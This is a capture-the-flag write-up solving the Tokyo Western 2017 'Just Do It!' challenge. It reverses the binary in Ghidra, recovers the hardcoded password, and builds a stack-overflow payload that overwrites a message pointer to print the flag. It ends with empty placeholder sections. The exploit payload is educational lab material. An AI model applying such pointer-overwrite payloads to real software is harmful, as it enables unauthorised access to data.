---
search:
  exclude: true
---
# Tokyo Western 2017 - Just Do It!

## Downloading the binary file 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tw17_justdoit/just_do_it
    --2021-02-23 15:25:50--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tw17_justdoit/just_do_it
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/04-bof_variable/tw17_justdoit/just_do_it [following]
    --2021-02-23 15:25:51--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/04-bof_variable/tw17_justdoit/just_do_it
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 7792 (7.6K) [application/octet-stream]
    Saving to: ‘just_do_it’
    
    just_do_it                                                                      100%[=======================================================================================================================================================================================================>]   7.61K  --.-KB/s    in 0s
    
    2021-02-23 15:25:51 (35.9 MB/s) - ‘just_do_it’ saved [7792/7792]
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → file just_do_it
    just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → chmod +x just_do_it
    
    

` ![]()

## Solution 

First of all, let's run the binary file to see what it does:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → ./just_do_it
    Welcome my secret service. Do you know the password?
    Input the password.
    not_the_password
    Invalid Password, Try Again!
    
    

Again, this is the kind of binary files that wants us to give them the correct password, so it's time to checksec it and see what ghidra finds:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → pwn checksec just_do_it
    [*] '/home/nothing/binexp/2/justdoit/just_do_it'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    
    

` ![](9.png)
    
    
    undefined4 main(void)
    
    {
      char *pcVar1;
      int iVar2;
      char local_28 [16];
      FILE *local_18;
      char *local_14;
      undefined *local_c;
      
      local_c = &stack0x00000004;
      setvbuf(stdin,(char *)0x0,2,0);
      setvbuf(stdout,(char *)0x0,2,0);
      setvbuf(stderr,(char *)0x0,2,0);
      local_14 = failed_message;
      local_18 = fopen("flag.txt","r");
      if (local_18 == (FILE *)0x0) {
        perror("file open error.\n");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      pcVar1 = fgets(flag,0x30,local_18);
      if (pcVar1 == (char *)0x0) {
        perror("file read error.\n");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("Welcome my secret service. Do you know the password?");
      puts("Input the password.");
      pcVar1 = fgets(local_28,0x20,stdin);
      if (pcVar1 == (char *)0x0) {
        perror("input error.\n");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      iVar2 = strcmp(local_28,PASSWORD);
      if (iVar2 == 0) {
        local_14 = success_message;
      }
      puts(local_14);
      return 0;
    }
    

here we have the code of the main function and we see something: first of all it checks if flag.txt is here, and then it prompts for our text input, putting it in the local_28 variable, and then later on, our input text (local_28) gets compared to the PASSWORD variable, so let's double click it in ghidra to see what it contains:

![](10.png)
    
    
                                 PASSWORD                                        XREF[2]:     Entry Point(*), main:080486d0(R)  
            0804a03c c8 87 04 08     addr       s_P@SSW0RD_080487c8                              = "P@SSW0RD"
    
    

now in the code we see something particular:
    
    
      pcVar1 = fgets(local_28,0x20,stdin);
      if (pcVar1 == (char *)0x0) {
        perror("input error.\n");
                        /* WARNING: Subroutine does not return */
        exit(0);
    
    

So our input text passes into an fget call, which means that even though we have the password, the fgets call will append a newline character (0x0a) at the end, so to pass the check we need a nullbyte after P@SSW0RD, to do so we will use python: 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/justdoit]
    → ./just_do_it
    Welcome my secret service. Do you know the password?
    Input the password.
    P@SSW0RD
    Invalid Password, Try Again!
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/justdoit]
    → python -c 'print "P@SSW0RD" + "\x00"'
    P@SSW0RD
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/justdoit]
    → python -c 'print "P@SSW0RD" + "\x00"' | ./just_do_it
    Welcome my secret service. Do you know the password?
    Input the password.
    Correct Password, Welcome!
    
    

Now here we basically managed to pass the check, but that's not it, we see from the disassembly code that the fgets call can input 32 bytes worth of data (looking at the stack below : 0x28 - 0x18 = 16 (since it's hexadecimal)).

![](11.png)

with this we can reach the output message being printed with a puts call, right before the function returns, so let's take another look at the code portion where flag.txt is handled:
    
    
      local_18 = fopen("flag.txt","r");
      if (local_18 == (FILE *)0x0) {
        perror("file open error.\n");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      pcVar1 = fgets(flag,0x30,local_18);
      if (pcVar1 == (char *)0x0) {
        perror("file read error.\n");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
    
    

What we see here is that after it opens the flag.txt file, it scans in 48 bytes (here its 0x30 bytes in hexa). So the idea here is to find the address of where the flag file is stored, and then, to overwrite the value of the output message (puts call) with it to print the contents of flag:
    
    
                                 flag                                            XREF[2]:     Entry Point(*), main:08048650(*)  
            0804a080 00 00 00        undefine
                     00 00 00 
                     00 00 00 
               0804a080 00              undefined100h                     [0]                               XREF[2]:     Entry Point(*), main:08048650(*)  
               0804a081 00              undefined100h                     [1]
    
    [...]
    
               0804a0aa 00              undefined100h                     [42]
               0804a0ab 00              undefined100h                     [43]
               0804a0ac 00              undefined100h                     [44]
               0804a0ad 00              undefined100h                     [45]
               0804a0ae 00              undefined100h                     [46]
               0804a0af 00              undefined100h                     [47]
    
    

After double clicking on the flag variable, we get the code above, so we know that flag is at the address 0x0804a080, now if we look at the beginning of main, we see that the input variable (local_28) and the output message (local 14) are separated by 20 bytes worth of data:

![](12.png)
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main(undefined1 param_1)
                 undefined         AL:1           
                 undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     080485bb(*)  
                 undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     080485c2(R)  
                 undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08048704(R)  
                 undefined4        Stack[-0x14]:4 local_14                                XREF[2]:     0804860d(W), 
                                                                                                       080486ee(W)  
                 undefined4        Stack[-0x18]:4 local_18                                XREF[3]:     08048625(W), 
                                                                                                       08048628(R), 
                                                                                                       0804864b(R)  
                 undefined1        Stack[-0x28]:1 local_28                                XREF[2]:     080486a6(*), 
                                                                                                       080486d9(*)  
                                 main                                            XREF[4]:     Entry Point(*), 
                                                                                              _start:080484d7(*), 0804886c, 
                                                                                              080488c8(*)  
            080485bb 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]
    
    

Now let's highlight just the parts we need:

![](13.png)

0x28 - 0x14 = 20 bytes, so let's create a payload that has 20 null bytes:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"'
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | xxd
    00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000010: 0000 0000 80a0 0408 0a                   .........
    
    

here we can see with xxd what the payload looks like, now let's try it on the binary:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/justdoit]
    → python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | ./just_do_it
    Welcome my secret service. Do you know the password?
    Input the password.
    flag{g0ttem_b0yz}
    
    

And there we have it!

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

